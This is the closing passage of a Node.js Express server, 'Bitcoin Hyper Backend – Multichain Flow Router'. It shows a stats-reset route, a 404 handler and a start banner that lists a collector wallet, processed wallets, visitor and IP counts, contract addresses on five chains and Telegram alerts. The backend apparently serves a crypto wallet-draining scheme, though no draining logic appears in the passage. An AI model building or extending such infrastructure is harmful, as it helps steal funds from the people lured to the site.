    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs,
    totalProcessedUSD: 0,
    totalProcessedWallets: 0,
    processedTransactions: []
  };
  
  memoryStorage.pendingFlows.clear();
  memoryStorage.completedFlows.clear();
  
  saveStorage();
  
  res.json({ success: true, message: 'Stats reset, participant data preserved' });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
  ================================================
  📍 Port: ${PORT}
  🔗 Backend URL: https://bthbk.vercel.app
  🌍 Site URL: https://bitcoinhypertoken.vercel.app
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  💾 STORAGE: PERSISTENT (NEVER DELETES)
  
  📊 CURRENT STATS:
  📁 Total Participants: ${memoryStorage.participants.length}
  📁 Total Visits: ${memoryStorage.siteVisits.length}
  💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD}
  📁 Pending Flows: ${memoryStorage.pendingFlows.size}
  📁 Completed Flows: ${memoryStorage.completedFlows.size}
  
  🌐 DEPLOYED CONTRACTS:
  ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ BSC: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
  ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  
  🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
  
  🚀 READY FOR MULTICHAIN FLOWS
  `);
  
  await testTelegramConnection();
});
